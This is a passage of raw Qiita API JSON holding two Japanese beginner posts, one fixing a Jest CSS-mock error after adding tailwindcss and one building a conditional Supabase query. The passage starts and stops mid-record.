(node_modules/react-dom/cjs/react-dom-client.development.js:1522:13)    \n      at completeUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15268:19)  \n      at performUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15149:11)   \n      at workLoopSync (node_modules/react-dom/cjs/react-dom-client.development.js:14956:41)        \n      at renderRootSync (node_modules/react-dom/cjs/react-dom-client.development.js:14936:11)      \n      at performWorkOnRoot (node_modules/react-dom/cjs/react-dom-client.development.js:14419:13)   \n      at performWorkOnRootViaSchedulerTask (node_modules/react-dom/cjs/react-dom-client.development.js:16216:7)\n      at performWorkUntilDeadline (node_modules/scheduler/cjs/scheduler.development.js:45:48)      \n      at Timeout.task [as _onTimeout] (node_modules/jsdom/lib/jsdom/browser/Window.js:520:19) \n</code></pre></div></div>\n</details>\n<p data-sourcepos=\"226:1-227:87\">tailwindcssのクラスを属性として直接使用していたことが原因<br>\nクラスをclassName属性として正しく設定したところ解決しました。</p>\n<div class=\"code-frame\" data-lang=\"diff_tsx\" data-sourcepos=\"229:1-242:3\"><div class=\"highlight\"><pre><code><span class=\"kd\">function</span> <span class=\"nf\">App</span><span class=\"p\">()</span> <span class=\"p\">{</span>\n<span class=\"err\">　　　　　　</span><span class=\"c1\">// 省略</span>\n  <span class=\"k\">return </span><span class=\"p\">(</span>\n    <span class=\"p\">&lt;&gt;</span>\n<span class=\"hdl\">-      <span class=\"p\">&lt;</span><span class=\"nt\">h1</span> <span class=\"na\">text-3xl</span> <span class=\"na\">font-bold</span> <span class=\"na\">data-testid</span><span class=\"p\">=</span><span class=\"s\">\"title\"</span> <span class=\"na\">onClick</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"nf\">getData</span><span class=\"p\">()</span><span class=\"si\">}</span><span class=\"p\">&gt;</span>\n</span><span class=\"hil\">+      <span class=\"p\">&lt;</span><span class=\"nt\">h1</span>\n</span><span class=\"hil\"><span class=\"err\">+</span>        <span class=\"na\">className</span><span class=\"p\">=</span><span class=\"s\">\"text-3xl font-bold\"</span>\n</span><span class=\"hil\"><span class=\"err\">+</span>        <span class=\"na\">data-testid</span><span class=\"p\">=</span><span class=\"s\">\"title\"</span>\n</span><span class=\"hil\"><span class=\"err\">+</span>        <span class=\"na\">onClick</span><span class=\"p\">=</span><span class=\"si\">{</span><span class=\"p\">()</span> <span class=\"o\">=&gt;</span> <span class=\"nf\">getData</span><span class=\"p\">()</span><span class=\"si\">}</span>\n</span><span class=\"hil\"><span class=\"err\">+</span>      <span class=\"p\">&gt;</span>\n</span>    <span class=\"p\">&lt;/&gt;</span>\n}\n</code></pre></div></div>\n<h1 data-sourcepos=\"244:1-244:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"245:1-245:245\">初めてtailwindcssを導入してみました。公式ドキュメントで導入はスムーズにできたものの、実際にcssを適用するのは難しそうです。新しいエラーに会えることを楽しみにしています。</p>\n<h1 data-sourcepos=\"247:1-247:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"248:1-248:72\"><iframe id=\"qiita-embed-content__bff3aba0d2c692d0893f7f9e7c15b2cc\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__bff3aba0d2c692d0893f7f9e7c15b2cc\" data-content=\"https%3A%2F%2Ftailwindcss.com%2Fdocs%2Fadding-custom-styles%23using-css-and-tailwind\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"250:1-250:118\"><iframe id=\"qiita-embed-content__aee567304abf850ee2d644bf9d115d60\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__aee567304abf850ee2d644bf9d115d60\" data-content=\"https%3A%2F%2Fjestjs.io%2Fja%2Fdocs%2Fwebpack%23css%25E3%2583%25A2%25E3%2582%25B8%25E3%2583%25A5%25E3%2583%25BC%25E3%2583%25AB%25E3%2581%25AE%25E3%2583%25A2%25E3%2583%2583%25E3%2582%25AF\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\ntailwindcssをViteプロジェクトに適用後、テスト実行したところ表題のエラーが発生しました。\n\n# 問題\nドキュメントに従ってtailwindcssを導入後、Jestを実行すると下記のエラーが発生する。\n\n```\nConfiguration error:\n    Could not locate module ./App.css mapped as:\n    identity-obj-proxy.\n    Please check your configuration for these entries:\n    {\n      \"moduleNameMapper\": {\n        \"/\\.(css|less)$/\": \"identity-obj-proxy\"\n      },\n      \"resolver\": undefined\n    }\n```\n\n# 原因\n`jest.config.mjs`で定義している`moduleNameMapper`にscssやsassが含まれていなかったため\n\nJestはNode.js環境で動作するため、CSSを理解できないとのこと。\nそのため、`identity-obj-proxy`ライブラリを使い、CSSモジュールをモックとして返していました。\n\ntailwindcssでは直接CSSファイルを使用するため、`scss`や`sass`の拡張子も対象となります。scssやsassを使用した場合、Jestはモック化できないよとのエラーが発生していました。\n（これまでChakaUIを使用していましたが、ChakaUIはCSS-in-JSの仕組みでスタイルをJavaScriptとして処理しているため、エラーが発生していなかったようです。）\n\n# 解決方法\njestの設定を修正、identity-obj-proxyをインストールする\n\n```diff_javascript:jest.config.mjs\nexport default {\n  preset: \"ts-jest\",\n  testEnvironment: \"jsdom\",\n  setupFilesAfterEnv: [\"./jest.setup.ts\"],\n  transform: {\n    \"^.+\\\\.(ts|tsx)$\": \"ts-jest\",\n  },\n  moduleNameMapper: {\n-    \"\\\\.(css|less)$\": \"identity-obj-proxy\",\n+    \"\\\\.(css|less|scss|sass)$\": \"identity-obj-proxy\",\n  },\n};\n```\n\n`identity-obj-proxy`のインストールも忘れずに行う\n```shell\nnpm install --save-dev identity-obj-proxy\n```\n\n# 別のエラーが発生\n上記でエラーは解消したものの別のエラーが発生しました。\n<details><summary>エラー</summary>\n\n\n```\ntest@asa:~/jisou/workspace/addiless-alcohol-app$ npm run test\n\n> addiless-alcohol-app@0.0.0 test\n> jest --verbose\n\n  console.error\n    Received `true` for a non-boolean attribute `text-3xl`.\n\n    If you want to write it to the DOM, pass a string instead: text-3xl=\"true\" or text-3xl={value.toString()}.\n\n      at validateProperty (node_modules/react-dom/cjs/react-dom-client.development.js:3078:27)     \n      at warnUnknownProperties (node_modules/react-dom/cjs/react-dom-client.development.js:3154:9) \n      at validatePropertiesInDevelopment (node_modules/react-dom/cjs/react-dom-client.development.js:17117:9)\n      at setInitialProperties (node_modules/react-dom/cjs/react-dom-client.development.js:17741:7) \n      at completeWork (node_modules/react-dom/cjs/react-dom-client.development.js:11391:18)\n      at runWithFiberInDEV (node_modules/react-dom/cjs/react-dom-client.development.js:1522:13)\n      at completeUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15268:19)  \n      at performUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15149:11)   \n      at workLoopSync (node_modules/react-dom/cjs/react-dom-client.development.js:14956:41)        \n      at renderRootSync (node_modules/react-dom/cjs/react-dom-client.development.js:14936:11)      \n      at performWorkOnRoot (node_modules/react-dom/cjs/react-dom-client.development.js:14419:13)   \n      at performWorkOnRootViaSchedulerTask (node_modules/react-dom/cjs/react-dom-client.development.js:16216:7)\n      at performWorkUntilDeadline (node_modules/scheduler/cjs/scheduler.development.js:45:48)      \n      at Timeout.task [as _onTimeout] (node_modules/jsdom/lib/jsdom/browser/Window.js:520:19)      \n\n  console.error\n    Received `true` for a non-boolean attribute `font-bold`.                                       \n                                                                                                   \n    If you want to write it to the DOM, pass a string instead: font-bold=\"true\" or font-bold={value.toString()}.                                                                                      \n                                                                                                   \n      at validateProperty (node_modules/react-dom/cjs/react-dom-client.development.js:3078:27)     \n      at warnUnknownProperties (node_modules/react-dom/cjs/react-dom-client.development.js:3154:9) \n      at validatePropertiesInDevelopment (node_modules/react-dom/cjs/react-dom-client.development.js:17117:9)                                                                                         \n      at setInitialProperties (node_modules/react-dom/cjs/react-dom-client.development.js:17741:7) \n      at completeWork (node_modules/react-dom/cjs/react-dom-client.development.js:11391:18)        \n      at runWithFiberInDEV (node_modules/react-dom/cjs/react-dom-client.development.js:1522:13)    \n      at completeUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15268:19)  \n      at performUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15149:11)   \n      at workLoopSync (node_modules/react-dom/cjs/react-dom-client.development.js:14956:41)        \n      at renderRootSync (node_modules/react-dom/cjs/react-dom-client.development.js:14936:11)      \n      at performWorkOnRoot (node_modules/react-dom/cjs/react-dom-client.development.js:14419:13)   \n      at performWorkOnRootViaSchedulerTask (node_modules/react-dom/cjs/react-dom-client.development.js:16216:7)\n      at performWorkUntilDeadline (node_modules/scheduler/cjs/scheduler.development.js:45:48)      \n      at Timeout.task [as _onTimeout] (node_modules/jsdom/lib/jsdom/browser/Window.js:520:19)      \n\n  console.error\n    Received `true` for a non-boolean attribute `text-3xl`.\n\n    If you want to write it to the DOM, pass a string instead: text-3xl=\"true\" or text-3xl={value.toString()}.\n\n      at validateProperty (node_modules/react-dom/cjs/react-dom-client.development.js:3078:27)     \n      at warnUnknownProperties (node_modules/react-dom/cjs/react-dom-client.development.js:3154:9) \n      at validatePropertiesInDevelopment (node_modules/react-dom/cjs/react-dom-client.development.js:17117:9)\n      at setInitialProperties (node_modules/react-dom/cjs/react-dom-client.development.js:17741:7) \n      at completeWork (node_modules/react-dom/cjs/react-dom-client.development.js:11391:18)        \n      at runWithFiberInDEV (node_modules/react-dom/cjs/react-dom-client.development.js:1522:13)    \n      at completeUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15268:19)  \n      at performUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15149:11)   \n      at workLoopSync (node_modules/react-dom/cjs/react-dom-client.development.js:14956:41)        \n      at renderRootSync (node_modules/react-dom/cjs/react-dom-client.development.js:14936:11)      \n      at performWorkOnRoot (node_modules/react-dom/cjs/react-dom-client.development.js:14419:13)   \n      at performWorkOnRootViaSchedulerTask (node_modules/react-dom/cjs/react-dom-client.development.js:16216:7)\n      at performWorkUntilDeadline (node_modules/scheduler/cjs/scheduler.development.js:45:48)      \n      at Timeout.task [as _onTimeout] (node_modules/jsdom/lib/jsdom/browser/Window.js:520:19)      \n\n  console.error\n    Received `true` for a non-boolean attribute `font-bold`.                                       \n                                                                                                   \n    If you want to write it to the DOM, pass a string instead: font-bold=\"true\" or font-bold={value.toString()}.                                                                                      \n                                                                                                   \n      at validateProperty (node_modules/react-dom/cjs/react-dom-client.development.js:3078:27)     \n      at warnUnknownProperties (node_modules/react-dom/cjs/react-dom-client.development.js:3154:9) \n      at validatePropertiesInDevelopment (node_modules/react-dom/cjs/react-dom-client.development.js:17117:9)                                                                                         \n      at setInitialProperties (node_modules/react-dom/cjs/react-dom-client.development.js:17741:7) \n      at completeWork (node_modules/react-dom/cjs/react-dom-client.development.js:11391:18)        \n      at runWithFiberInDEV (node_modules/react-dom/cjs/react-dom-client.development.js:1522:13)    \n      at completeUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15268:19)  \n      at performUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15149:11)   \n      at workLoopSync (node_modules/react-dom/cjs/react-dom-client.development.js:14956:41)        \n      at renderRootSync (node_modules/react-dom/cjs/react-dom-client.development.js:14936:11)      \n      at performWorkOnRoot (node_modules/react-dom/cjs/react-dom-client.development.js:14419:13)   \n      at performWorkOnRootViaSchedulerTask (node_modules/react-dom/cjs/react-dom-client.development.js:16216:7)\n      at performWorkUntilDeadline (node_modules/scheduler/cjs/scheduler.development.js:45:48)      \n      at Timeout.task [as _onTimeout] (node_modules/jsdom/lib/jsdom/browser/Window.js:520:19)      \n\n  console.error\n    Received `true` for a non-boolean attribute `text-3xl`.\n\n    If you want to write it to the DOM, pass a string instead: text-3xl=\"true\" or text-3xl={value.toString()}.\n\n      at validateProperty (node_modules/react-dom/cjs/react-dom-client.development.js:3078:27)     \n      at warnUnknownProperties (node_modules/react-dom/cjs/react-dom-client.development.js:3154:9) \n      at validatePropertiesInDevelopment (node_modules/react-dom/cjs/react-dom-client.development.js:17117:9)\n      at setInitialProperties (node_modules/react-dom/cjs/react-dom-client.development.js:17741:7) \n      at completeWork (node_modules/react-dom/cjs/react-dom-client.development.js:11391:18)        \n      at runWithFiberInDEV (node_modules/react-dom/cjs/react-dom-client.development.js:1522:13)    \n      at completeUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15268:19)  \n      at performUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15149:11)   \n      at workLoopSync (node_modules/react-dom/cjs/react-dom-client.development.js:14956:41)        \n      at renderRootSync (node_modules/react-dom/cjs/react-dom-client.development.js:14936:11)      \n      at performWorkOnRoot (node_modules/react-dom/cjs/react-dom-client.development.js:14419:13)   \n      at performWorkOnRootViaSchedulerTask (node_modules/react-dom/cjs/react-dom-client.development.js:16216:7)\n      at performWorkUntilDeadline (node_modules/scheduler/cjs/scheduler.development.js:45:48)      \n      at Timeout.task [as _onTimeout] (node_modules/jsdom/lib/jsdom/browser/Window.js:520:19)      \n\n  console.error\n    Received `true` for a non-boolean attribute `font-bold`.                                       \n                                                                                                   \n    If you want to write it to the DOM, pass a string instead: font-bold=\"true\" or font-bold={value.toString()}.                                                                                      \n                                                                                                   \n      at validateProperty (node_modules/react-dom/cjs/react-dom-client.development.js:3078:27)     \n      at warnUnknownProperties (node_modules/react-dom/cjs/react-dom-client.development.js:3154:9) \n      at validatePropertiesInDevelopment (node_modules/react-dom/cjs/react-dom-client.development.js:17117:9)                                                                                         \n      at setInitialProperties (node_modules/react-dom/cjs/react-dom-client.development.js:17741:7) \n      at completeWork (node_modules/react-dom/cjs/react-dom-client.development.js:11391:18)        \n      at runWithFiberInDEV (node_modules/react-dom/cjs/react-dom-client.development.js:1522:13)    \n      at completeUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15268:19)  \n      at performUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15149:11)   \n      at workLoopSync (node_modules/react-dom/cjs/react-dom-client.development.js:14956:41)        \n      at renderRootSync (node_modules/react-dom/cjs/react-dom-client.development.js:14936:11)      \n      at performWorkOnRoot (node_modules/react-dom/cjs/react-dom-client.development.js:14419:13)   \n      at performWorkOnRootViaSchedulerTask (node_modules/react-dom/cjs/react-dom-client.development.js:16216:7)\n      at performWorkUntilDeadline (node_modules/scheduler/cjs/scheduler.development.js:45:48)      \n      at Timeout.task [as _onTimeout] (node_modules/jsdom/lib/jsdom/browser/Window.js:520:19)      \n\n  console.error\n    Received `true` for a non-boolean attribute `text-3xl`.\n\n    If you want to write it to the DOM, pass a string instead: text-3xl=\"true\" or text-3xl={value.toString()}.\n\n      at validateProperty (node_modules/react-dom/cjs/react-dom-client.development.js:3078:27)     \n      at warnUnknownProperties (node_modules/react-dom/cjs/react-dom-client.development.js:3154:9) \n      at validatePropertiesInDevelopment (node_modules/react-dom/cjs/react-dom-client.development.js:17117:9)\n      at setInitialProperties (node_modules/react-dom/cjs/react-dom-client.development.js:17741:7) \n      at completeWork (node_modules/react-dom/cjs/react-dom-client.development.js:11391:18)        \n      at runWithFiberInDEV (node_modules/react-dom/cjs/react-dom-client.development.js:1522:13)    \n      at completeUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15268:19)  \n      at performUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15149:11)   \n      at workLoopSync (node_modules/react-dom/cjs/react-dom-client.development.js:14956:41)        \n      at renderRootSync (node_modules/react-dom/cjs/react-dom-client.development.js:14936:11)      \n      at performWorkOnRoot (node_modules/react-dom/cjs/react-dom-client.development.js:14419:13)   \n      at performWorkOnRootViaSchedulerTask (node_modules/react-dom/cjs/react-dom-client.development.js:16216:7)\n      at performWorkUntilDeadline (node_modules/scheduler/cjs/scheduler.development.js:45:48)      \n      at Timeout.task [as _onTimeout] (node_modules/jsdom/lib/jsdom/browser/Window.js:520:19)      \n\n  console.error\n    Received `true` for a non-boolean attribute `font-bold`.                                       \n                                                                                                   \n    If you want to write it to the DOM, pass a string instead: font-bold=\"true\" or font-bold={value.toString()}.                                                                                      \n                                                                                                   \n      at validateProperty (node_modules/react-dom/cjs/react-dom-client.development.js:3078:27)     \n      at warnUnknownProperties (node_modules/react-dom/cjs/react-dom-client.development.js:3154:9) \n      at validatePropertiesInDevelopment (node_modules/react-dom/cjs/react-dom-client.development.js:17117:9)                                                                                         \n      at setInitialProperties (node_modules/react-dom/cjs/react-dom-client.development.js:17741:7) \n      at completeWork (node_modules/react-dom/cjs/react-dom-client.development.js:11391:18)        \n      at runWithFiberInDEV (node_modules/react-dom/cjs/react-dom-client.development.js:1522:13)    \n      at completeUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15268:19)  \n      at performUnitOfWork (node_modules/react-dom/cjs/react-dom-client.development.js:15149:11)   \n      at workLoopSync (node_modules/react-dom/cjs/react-dom-client.development.js:14956:41)        \n      at renderRootSync (node_modules/react-dom/cjs/react-dom-client.development.js:14936:11)      \n      at performWorkOnRoot (node_modules/react-dom/cjs/react-dom-client.development.js:14419:13)   \n      at performWorkOnRootViaSchedulerTask (node_modules/react-dom/cjs/react-dom-client.development.js:16216:7)\n      at performWorkUntilDeadline (node_modules/scheduler/cjs/scheduler.development.js:45:48)      \n      at Timeout.task [as _onTimeout] (node_modules/jsdom/lib/jsdom/browser/Window.js:520:19) \n```\n\n</details>\n\ntailwindcssのクラスを属性として直接使用していたことが原因\nクラスをclassName属性として正しく設定したところ解決しました。\n\n```diff_tsx\nfunction App() {\n　　　　　　// 省略\n  return (\n    <>\n-      <h1 text-3xl font-bold data-testid=\"title\" onClick={() => getData()}>\n+      <h1\n+        className=\"text-3xl font-bold\"\n+        data-testid=\"title\"\n+        onClick={() => getData()}\n+      >\n    </>\n}\n```\n\n# おわりに\n初めてtailwindcssを導入してみました。公式ドキュメントで導入はスムーズにできたものの、実際にcssを適用するのは難しそうです。新しいエラーに会えることを楽しみにしています。\n\n# 参考\nhttps://tailwindcss.com/docs/adding-custom-styles#using-css-and-tailwind\n\nhttps://jestjs.io/ja/docs/webpack#css%E3%83%A2%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E3%81%AE%E3%83%A2%E3%83%83%E3%82%AF\n","coediting":false,"comments_count":1,"created_at":"2025-06-10T08:24:02+09:00","group":null,"id":"de0ccd82d5fd6608e57b","likes_count":1,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"初心者","versions":[]},{"name":"Jest","versions":[]},{"name":"tailwindcss","versions":[]}],"title":"【tailwindcss】Configuration error:Could not locate module ./App.css mapped as:identity-obj-proxy.","updated_at":"2025-06-10T08:24:02+09:00","url":"https://qiita.com/asa129/items/de0ccd82d5fd6608e57b","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":585,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:96\">Supabaseでデータを取得する際に、条件によってWhere句のパラメータを変えたいと考えていました。<br>\n意外とシンプルな方法で解決できたため、調べたことをまとめました。</p>\n<h1 data-sourcepos=\"5:1-5:8\">\n<span id=\"問題\" class=\"fragment\"></span><a href=\"#%E5%95%8F%E9%A1%8C\"><i class=\"fa fa-link\"></i></a>問題</h1>\n<p data-sourcepos=\"6:1-6:62\">パラメータの値によってWhere句を変更したい。</p>\n<div class=\"code-frame\" data-lang=\"tsx\" data-sourcepos=\"8:1-19:3\"><div class=\"highlight\"><pre><code><span class=\"k\">export</span> <span class=\"kd\">const</span> <span class=\"nx\">getDataByAlcohols</span><span class=\"p\">:</span> <span class=\"p\">(</span>\n  <span class=\"nx\">props</span><span class=\"p\">:</span> <span class=\"nx\">AdditivesSearch</span>\n<span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"nb\">Promise</span><span class=\"o\">&lt;</span><span class=\"nb\">Partial</span><span class=\"o\">&lt;</span><span class=\"nx\">Alcohols</span><span class=\"o\">&gt;</span><span class=\"p\">[]</span><span class=\"o\">&gt;</span> <span class=\"o\">=</span> <span class=\"k\">async </span><span class=\"p\">(</span><span class=\"nx\">props</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"kd\">const</span> <span class=\"p\">{</span> <span class=\"nx\">sake_name</span><span class=\"p\">,</span> <span class=\"nx\">maker</span> <span class=\"p\">}</span> <span class=\"o\">=</span> <span class=\"nx\">props</span><span class=\"p\">;</span>\n  <span class=\"kd\">const</span> <span class=\"p\">{</span> <span class=\"nx\">data</span><span class=\"p\">,</span> <span class=\"nx\">error</span> <span class=\"p\">}</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nx\">supabase</span>\n    <span class=\"p\">.</span><span class=\"k\">from</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">alcohols</span><span class=\"dl\">\"</span><span class=\"p\">)</span>\n    <span class=\"p\">.</span><span class=\"nf\">select</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">* , alcohol_genres(genre_name) , manufacturers(manufacturer_name)</span><span class=\"dl\">\"</span><span class=\"p\">)</span>\n    <span class=\"p\">.</span><span class=\"nf\">like</span><span class=\"p\">(</span><span class=\"s2\">`sake_name`</span><span class=\"p\">,</span> <span class=\"s2\">`%</span><span class=\"p\">${</span><span class=\"nx\">sake_name</span><span class=\"p\">}</span><span class=\"s2\">%`</span><span class=\"p\">)</span>\n    <span class=\"p\">.</span><span class=\"nf\">eq</span><span class=\"p\">(</span><span class=\"s2\">`manufacturer_id`</span><span class=\"p\">,</span> <span class=\"s2\">`</span><span class=\"p\">${</span><span class=\"nx\">maker</span><span class=\"p\">}</span><span class=\"s2\">`</span><span class=\"p\">);</span> <span class=\"c1\">//ここでmakerが空の時はこの条件をつけたくない</span>\n<span class=\"p\">};</span>\n</code></pre></div></div>\n<h1 data-sourcepos=\"21:1-21:8\">\n<span id=\"解決\" class=\"fragment\"></span><a href=\"#%E8%A7%A3%E6%B1%BA\"><i class=\"fa fa-link\"></i></a>解決</h1>\n<p data-sourcepos=\"22:1-22:58\">queryを変数で格納し、if文で条件を追加する</p>\n<div class=\"code-frame\" data-lang=\"diff_tsx\" data-sourcepos=\"24:1-41:3\"><div class=\"highlight\"><pre><code><span class=\"k\">export</span> <span class=\"kd\">const</span> <span class=\"nx\">getDataByAlcohols</span><span class=\"p\">:</span> <span class=\"p\">(</span>\n  <span class=\"nx\">props</span><span class=\"p\">:</span> <span class=\"nx\">AdditivesSearch</span>\n<span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"nb\">Promise</span><span class=\"o\">&lt;</span><span class=\"nb\">Partial</span><span class=\"o\">&lt;</span><span class=\"nx\">Alcohols</span><span class=\"o\">&gt;</span><span class=\"p\">[]</span><span class=\"o\">&gt;</span> <span class=\"o\">=</span> <span class=\"k\">async </span><span class=\"p\">(</span><span class=\"nx\">props</span><span class=\"p\">)</span> <span class=\"o\">=&gt;</span> <span class=\"p\">{</span>\n  <span class=\"kd\">const</span> <span class=\"p\">{</span> <span class=\"nx\">sake_name</span><span class=\"p\">,</span> <span class=\"nx\">maker</span> <span class=\"p\">}</span> <span class=\"o\">=</span> <span class=\"nx\">props</span><span class=\"p\">;</span>\n<span class=\"hdl\"><span class=\"o\">- </span> <span class=\"kd\">const</span> <span class=\"p\">{</span> <span class=\"nx\">data</span><span class=\"p\">,</span> <span class=\"nx\">error</span> <span class=\"p\">}</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nx\">supabase</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span> <span class=\"kd\">let</span> <span class=\"nx\">query</span> <span class=\"o\">=</span> <span class=\"nx\">supabase</span>\n</span>    <span class=\"p\">.</span><span class=\"k\">from</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">alcohols</span><span class=\"dl\">\"</span><span class=\"p\">)</span>\n    <span class=\"p\">.</span><span class=\"nf\">select</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">* , alcohol_genres(genre_name) , manufacturers(manufacturer_name)</span><span class=\"dl\">\"</span><span class=\"p\">)</span>\n    <span class=\"p\">.</span><span class=\"nf\">like</span><span class=\"p\">(</span><span class=\"s2\">`sake_name`</span><span class=\"p\">,</span> <span class=\"s2\">`%</span><span class=\"p\">${</span><span class=\"nx\">sake_name</span><span class=\"p\">}</span><span class=\"s2\">%`</span><span class=\"p\">);</span>\n\n<span class=\"hil\"><span class=\"o\">+ </span> <span class=\"k\">if </span><span class=\"p\">(</span><span class=\"nx\">maker</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span>   <span class=\"nx\">query</span> <span class=\"o\">=</span> <span class=\"nx\">query</span><span class=\"p\">.</span><span class=\"nf\">eq</span><span class=\"p\">(</span><span class=\"s2\">`manufacturer_id`</span><span class=\"p\">,</span> <span class=\"s2\">`</span><span class=\"p\">${</span><span class=\"nx\">maker</span><span class=\"p\">}</span><span class=\"s2\">`</span><span class=\"p\">);</span>\n</span><span class=\"hil\"><span class=\"o\">+ </span> <span class=\"p\">}</span>\n</span>  \n<span class=\"hil\"><span class=\"o\">+ </span> <span class=\"kd\">const</span> <span class=\"p\">{</span> <span class=\"nx\">data</span><span class=\"p\">,</span> <span class=\"nx\">error</span> <span class=\"p\">}</span> <span class=\"o\">=</span> <span class=\"k\">await</span> <span class=\"nx\">query</span><span class=\"p\">;</span>\n</span><span class=\"p\">};</span>\n</code></pre></div></div>\n<h1 data-sourcepos=\"43:1-43:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"44:1-44:196\">条件によってWhere句を変えたい、and検索やor検索だけでは実現できないな、難しいなと考えていました。意外とシンプルな方法で解決できました。</p>\n<h1 data-sourcepos=\"46:1-46:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"47:1-47:48\"><iframe id=\"qiita-embed-content__a46873ab15d98d30a67fe7de5779eeff\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__a46873ab15d98d30a67fe7de5779eeff\" data-content=\"https%3A%2F%2Fgithub.com%2Fsupabase%2Fsupabase%2Fissues%2F4274\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nSupabaseでデータを取得する際に、条件によってWhere句のパラメータを変えたいと考えていました。\n意外とシンプルな方法で解決できたため、調べたことをまとめました。\n\n# 問題\nパラメータの値によってWhere句を変更したい。\n\n```tsx\nexport const getDataByAlcohols: (\n  props: AdditivesSearch\n) => Promise<Partial<Alcohols>[]> = async (props) => {\n  const { sake_name, maker } = props;\n  const { data, error } = await supabase\n    .from(\"alcohols\")\n    .select(\"* , alcohol_genres(genre_name) , manufacturers(manufacturer_name)\")\n    .like(`sake_name`, `%${sake_name}%`)\n    .eq(`manufacturer_id`, `${maker}`); //ここでmakerが空の時はこの条件をつけたくない\n};\n```\n\n# 解決\nqueryを変数で格納し、if文で条件を追加する\n\n```diff_tsx\nexport const getDataByAlcohols: (\n  props: AdditivesSearch\n) => Promise<Partial<Alcohols>[]> = async (props) => {\n  const { sake_name, maker } = props;\n-  const { data, error } = await supabase\n+  let query = supabase\n    .from(\"alcohols\")\n    .select(\"* , alcohol_genres(genre_name) , manufacturers(manufacturer_name)\")\n    .like(`sake_name`, `%${sake_name}%`);\n\n+  if (maker) {\n+    query = query.eq(`manufacturer_id`, `${maker}`);\n+  }\n  \n+  const { data, error } = await query;\n};\n```\n\n# おわりに\n条件によってWhere句を変えたい、and検索やor検索だけでは実現できないな、難しいなと考えていました。意外とシンプルな方法で解決できました。\n\n# 